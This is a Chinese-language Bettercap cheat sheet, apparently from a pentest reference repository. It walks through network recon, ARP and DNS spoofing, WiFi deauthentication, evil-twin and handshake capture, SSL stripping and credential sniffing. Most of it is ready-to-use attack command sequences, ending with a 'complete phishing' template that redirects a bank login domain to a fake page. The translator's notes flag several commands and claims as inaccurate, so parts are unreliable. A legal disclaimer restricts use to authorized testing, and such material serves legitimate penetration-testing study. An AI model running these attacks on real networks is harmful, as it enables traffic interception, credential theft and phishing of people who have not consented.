# 🦈 Bettercap — 网络攻击框架速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
                          网络攻击的瑞士军刀
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Network">
</p>

---

## 📋 目录

- [什么是 Bettercap](#-what-is-bettercap)
- [安装](#-installation)
- [基本用法](#-basic-usage)
- [网络信息收集](#-network-reconnaissance)
- [ARP 欺骗（MITM）](#-arp-spoofing-mitm)
- [DNS 欺骗](#-dns-spoofing)
- [WiFi 攻击](#-wifi-attacks)
- [HTTPS 降级](#-https-downgrade)
- [凭据嗅探](#-credential-sniffing)
- [Caplet 脚本](#-caplets)
- [Web 界面](#-web-ui)
- [快速参考](#-quick-reference)

---

<a id="-what-is-bettercap"></a>

## 🎯 什么是 Bettercap

**Bettercap** 是集 WiFi、蓝牙和网络信息收集功能于一身的多用途工具，原文将其称为 ettercap 的后继者，并介绍了以下现代化功能：

- 🔍 **网络信息收集** — 发现主机和服务
- 🎭 **中间人攻击（MITM）** — ARP 欺骗、DNS 欺骗
- 📶 **WiFi 攻击** — 解除认证、恶意双胞胎热点、握手捕获
- 🔓 **凭据捕获** — HTTP、HTTPS（降级）
- 📡 **蓝牙／BLE（低功耗蓝牙）** — 设备发现与攻击
- 🌐 **Web 界面** — 直观的可视化界面

### 功能

| 功能 | 说明 |
|---------|-------------|
| **模块化** | 可通过 Caplet 扩展 |
| **交互式** | 实时命令行 |
| **可编写脚本** | 使用 Caplet 文件实现自动化 |
| **Web 界面** | 基于浏览器的界面 |
| **Go 语言** | 快速、现代、跨平台 |

---

<a id="-installation"></a>

## 🚀 安装

### Kali Linux（预装）

```bash
# Kali 中已预装
bettercap --help

# 更新
sudo apt update && sudo apt install bettercap
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

### 从源码安装

> **译注：**原 Go 安装路径是旧示例；当前 [官方安装文档](https://www.bettercap.org/project/installation/)使用包含 `/v2` 的模块路径，并列出系统依赖。原命令保留供版本对照。

```bash
# 先安装 Go
sudo apt install golang

# 安装 bettercap
go install github.com/bettercap/bettercap@latest

# 或者
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

### 安装界面（可选）

```bash
# 下载 Web 界面
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

<a id="-basic-usage"></a>

## 💻 基本用法

### 启动 Bettercap

```bash
# 基本启动方式（需要 root 权限）
sudo bettercap

# 指定接口
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# 非交互式运行（执行命令）
sudo bettercap -eval "net.probe on; net.show"

# 加载 Caplet 文件
sudo bettercap -caplet http-ui
```

### 交互式命令行

```bash
# 在 bettercap 命令行中
» help                      # 显示所有命令
» help net.probe            # 指定模块的帮助
» net.show                  # 显示已发现的主机
» set arp.spoof.targets X   # 设置变量
» arp.spoof on              # 启用模块
» quit                      # 退出
```

### 模块管理

```bash
# 列出所有模块
» help

# 获取模块信息
» help arp.spoof

# 启用模块
» arp.spoof on

# 禁用模块
» arp.spoof off

# 查看模块设置
» get arp.spoof.*
```

---

<a id="-network-reconnaissance"></a>

## 🔍 网络信息收集

### 主机发现

```bash
# 启用网络探测
» net.probe on

# 显示已发现的主机
» net.show

# 输出：
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

### 网络信息

```bash
# 显示当前接口
» net.show

# 接口信息
» get net.interface.*

# 网关信息
» get gateway.*
```

### 探测选项

```bash
# 设置探测节流间隔
» set net.probe.throttle 10

# 被动模式（仅监听）
» set net.probe.passive true

# 设置探测超时
» set net.probe.timeout 500
```

> **译注：**[`net.probe`](https://www.bettercap.org/modules/ethernet/netprobe/)会主动发送探测包，当前文档未列出上面的 `net.probe.passive`／`net.probe.timeout`；不能依靠这些未核实的设置将其变成被动模式。[`net.recon`](https://www.bettercap.org/modules/ethernet/netrecon/)读取系统 ARP 表；`net.show.meta` 是显示端点元数据，并不是“只显示活动主机”过滤器。原命令保留。

### 信息收集命令

```bash
# 完整信息收集
» net.recon on

# 清空主机列表
» net.clear

# 只显示活动主机
» set net.show.meta true
» net.show

# 导出到文件
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

<a id="-arp-spoofing-mitm"></a>

## 🎭 ARP 欺骗（MITM）

### 基本 ARP 欺骗

```bash
# 启动 bettercap
sudo bettercap -iface eth0

# 启用探测
» net.probe on

# 等待片刻后显示主机
» net.show

# 设置目标（受害主机）
» set arp.spoof.targets 192.168.1.100

# 启用 ARP 欺骗
» arp.spoof on

# 现在已处于 MITM 位置！
```

### 全双工（双向）

```bash
# 同时欺骗受害主机和网关
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

### 对整个子网进行欺骗

```bash
# 以所有主机为目标（网关除外）
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# 仅针对内部（不欺骗网关）
» set arp.spoof.internal true
» arp.spoof on
```

> **译注：**[`arp.spoof.internal`](https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/)表示也对局域网主机之间的连接进行欺骗，并非上文所写的“仅内部、不欺骗网关”；网关与目标的双向欺骗由 `arp.spoof.fullduplex` 控制。启用模块本身也不保证 MITM 成功，仍取决于网络和防护条件。原注释和示例保留供对照。

### ARP 欺骗与嗅探

```bash
# 完整 MITM 配置
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

<a id="-dns-spoofing"></a>

## 🌐 DNS 欺骗

### 基本 DNS 欺骗

```bash
# 设置 DNS 欺骗目标
» set dns.spoof.domains example.com, *.example.com

# 设置重定向地址（本机）
» set dns.spoof.address 192.168.1.50

# 启用（需要 ARP 欺骗）
» arp.spoof on
» dns.spoof on
```

### 欺骗所有域名

```bash
# 使用通配符重定向所有域名
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### 多个域名

```bash
# 域名列表
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### 结合 HTTP 服务器进行 DNS 欺骗

```bash
# 完整钓鱼配置
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# 在本机启动 HTTP 服务器
» set http.server.path /var/www/phishing
» http.server on
```

---

<a id="-wifi-attacks"></a>

## 📶 WiFi 攻击

> **译注：**以下示例依赖支持监控模式及注入的无线硬件／驱动。部分命令和参数（如 `wifi.show.wpa`、`wifi.deauth.station`、`wifi.deauth.repeat`）并非当前 [WiFi 模块文档](https://www.bettercap.org/modules/wifi/)列出的通用接口，须核对版本。`wifi.handshakes.file` 默认为聚合 PCAP 文件路径，不能一律当作目录；PMKID 捕获也只适用于存在相应条件的 AP。原命令保留。

### 启用 WiFi 模式

```bash
# 使用 WiFi 接口启动
sudo bettercap -iface wlan0

# 启用 WiFi 信息收集
» wifi.recon on

# 显示已发现的 AP
» wifi.show
```

### WiFi 信息收集

```bash
# 显示所有 AP
» wifi.show

# 输出：
┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

### 解除认证攻击

```bash
# 解除指定 AP 下所有客户端的认证
» wifi.deauth AA:BB:CC:DD:EE:FF

# 解除指定客户端的认证
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# 持续解除认证
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

### 捕获握手

```bash
# 启用 WiFi 信息收集
» wifi.recon on

# 设置频道（与目标一致）
» wifi.recon.channel 6

# 捕获握手
» set wifi.handshakes.file /tmp/handshakes/

# 通过解除认证迫使重新连接
» wifi.deauth AA:BB:CC:DD:EE:FF

# 查看已捕获的握手
» wifi.show.wpa
```

### 恶意双胞胎热点（Evil Twin）攻击

```bash
# 克隆 AP
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# 启动伪造 AP
» wifi.ap on

# 现在解除真实 AP 的客户端认证，迫使其连接
» wifi.deauth <real_AP_BSSID>
```

> **译注：**上方恶意双胞胎示例是简化描述：官方 [WiFi 文档](https://www.bettercap.org/modules/wifi/)将 `wifi.ap` 描述为伪造管理信标注入；仅设置名称、发送信标或解除认证，并不保证客户端自动关联，也不等于已构建可转发流量的完整热点。`wifi.ap on` 的适用性需结合具体版本与模块确认。

### PMKID 攻击

```bash
# 无需客户端的现代攻击
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# PMKID 保存在握手目录中
» wifi.show.wpa
```

---

<a id="-https-downgrade"></a>

## 🔒 HTTPS 降级

> **译注：**“HSTS 绕过”是原文的过度概括。SSL stripping 不能普遍绕过已生效或预加载的 [HSTS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security)；HTTPS 代理会使用自己的 CA 重新签发证书，客户端仍需接受其信任链，见 [https.proxy](https://www.bettercap.org/modules/ethernet/proxies/httpsproxy/)。仅启用 ARP、DNS 或代理模块并不能自动解密受正确 TLS 验证保护的流量。原示例保留。

### SSL 剥离（HSTS 绕过）

```bash
# 先启用 ARP 欺骗
» arp.spoof on

# 启用 SSL 剥离
» set https.proxy.sslstrip true
» https.proxy on

# 或使用 HTTP 代理
» http.proxy on
```

### HTTPS 代理

```bash
# 设置 HTTPS 代理
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# 使用证书
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

### 捕获 HTTPS 流量

```bash
# 结合 HTTPS 的完整 MITM
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

<a id="-credential-sniffing"></a>

## 🔓 凭据嗅探

### HTTP 凭据

```bash
# 启用嗅探
» net.sniff on

# 启用本地流量嗅探
» set net.sniff.local true
» net.sniff on

# 过滤 HTTP
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

### 收集凭据

```bash
# 完整凭据捕获
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# 凭据实时显示
```

### 保存到文件

```bash
# 保存捕获的数据包
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# 详细输出
» set net.sniff.verbose true
» net.sniff on
```

---

<a id="-caplets"></a>

## 📜 Caplet 脚本

### 什么是 Caplet？

Caplet 是扩展名为 .cap 的脚本文件，用于自动执行 bettercap 命令。

### 内置 Caplet

```bash
# 列出 Caplet
» caplets.show

# 常用 Caplet：
- http-ui       # Web 界面
- https-ui      # 安全 Web 界面
- local-sniffer # 嗅探本地流量
- mitm          # 基本 MITM 配置
- pita          # WiFi 攻击自动化
```

### 加载 Caplet

```bash
# 通过命令行
sudo bettercap -caplet http-ui

# 在 bettercap 中
» caplet http-ui

# 从文件加载
sudo bettercap -caplet /path/to/custom.cap
```

> **译注：**Caplet 是否存在取决于安装的脚本集合和版本；当前 [交互式会话文档](https://www.bettercap.org/usage/interactive_session/)提供 `include CAPLET` 等加载方式，并未将 `caplet http-ui` 列为通用核心命令。原示例保留。

### 创建自定义 Caplet

```bash
# 文件：my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# 运行自定义 Caplet
sudo bettercap -caplet my-mitm.cap
```

### 更新 Caplet

```bash
# 更新所有 Caplet
» caplets.update
```

---

<a id="-web-ui"></a>

## 🌐 Web 界面

### 启动 Web 界面

```bash
# 先安装界面
sudo bettercap -eval "caplets.update; ui.update; quit"

# 使用 Web 界面启动（HTTP）
sudo bettercap -caplet http-ui

# 使用 HTTPS 界面启动
sudo bettercap -caplet https-ui

# 访问：https://127.0.0.1:8080/
# 默认凭据：user/pass
```

> **译注：**上述 `https://127.0.0.1:8080/` 不是所有 UI 启动方式的统一地址。官方 [`http-ui.cap`](https://github.com/bettercap/caplets/blob/master/http-ui.cap)将界面与 API 分别放在 HTTP 端口 80／8081，[`https-ui.cap`](https://github.com/bettercap/caplets/blob/master/https-ui.cap)则使用 HTTPS 端口 443／8083；具体取决于本地配置。下方 `http.server.username`／`http.server.password` 也不等同于 UI 的 API 登录凭据，后者由 `api.rest.username`／`api.rest.password` 控制。原配置保留供对照。

### Web 界面功能

| 功能 | 说明 |
|---------|-------------|
| **Dashboard（仪表盘）** | 实时网络视图 |
| **Hosts（主机）** | 已发现的设备 |
| **WiFi** | 无线网络 |
| **BLE** | 蓝牙设备 |
| **Events（事件）** | 活动日志 |
| **Packets（数据包）** | 捕获的流量 |

### 配置 Web 界面

```bash
# 设置凭据
» set http.server.username admin
» set http.server.password secretpass

# 设置端口
» set http.server.port 8080

# 绑定地址
» set http.server.address 0.0.0.0
```

---

<a id="-quick-reference"></a>

## 📊 快速参考

### 常用命令

| 命令 | 说明 |
|---------|-------------|
| `net.probe on` | 启动主机发现 |
| `net.show` | 显示已发现的主机 |
| `arp.spoof on` | 启用 ARP 欺骗 |
| `net.sniff on` | 开始捕获数据包 |
| `dns.spoof on` | 启用 DNS 欺骗 |
| `wifi.recon on` | 开始 WiFi 扫描 |
| `wifi.deauth BSSID` | 解除认证攻击 |
| `https.proxy on` | 启用 HTTPS 代理 |

### 常用变量

| 变量 | 说明 |
|----------|-------------|
| `arp.spoof.targets` | MITM 目标 |
| `arp.spoof.fullduplex` | 双向欺骗 |
| `dns.spoof.domains` | 要欺骗的域名 |
| `dns.spoof.address` | 重定向目标 IP |
| `net.sniff.output` | PCAP 输出文件 |
| `wifi.ap.ssid` | 伪造 AP 名称 |

### MITM 攻击模板

```bash
# 基本 MITM
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

### WiFi 攻击模板

```bash
# WiFi 解除认证与捕获
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

### 完整钓鱼攻击

```bash
# DNS 欺骗与伪造站点
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

## ⚠️ 法律免责声明

```
⚠️ 警告：Bettercap 是一款功能强大的工具，可以截获
网络流量。只能用于你拥有的网络，或已获得
明确书面测试许可的网络。

✅ 经授权的渗透测试
✅ 安全研究（实验室环境）
✅ 教学用途

❌ 未经授权的截获属于违法行为
❌ 不得用于公共网络
❌ 不得窃取凭据
```

---

## 📚 参考资料

- [Bettercap 官网](https://www.bettercap.org/)
- [Bettercap GitHub](https://github.com/bettercap/bettercap)
- [Bettercap 文档](https://www.bettercap.org/usage/interactive_session/)
- [Caplets](https://github.com/bettercap/caplets)

### 相关速查表
- [Aircrack-ng](../../Aircrack-ng/README.md)
- [Wifite](../../Wifite/README.md)
- [Wireshark](../../Wireshark/README.md)

---

<p align="center">
  <b>🦈 掌握网络攻击技术！</b><br>
  <i>Bettercap — 网络渗透测试的多用途工具</i>
</p>
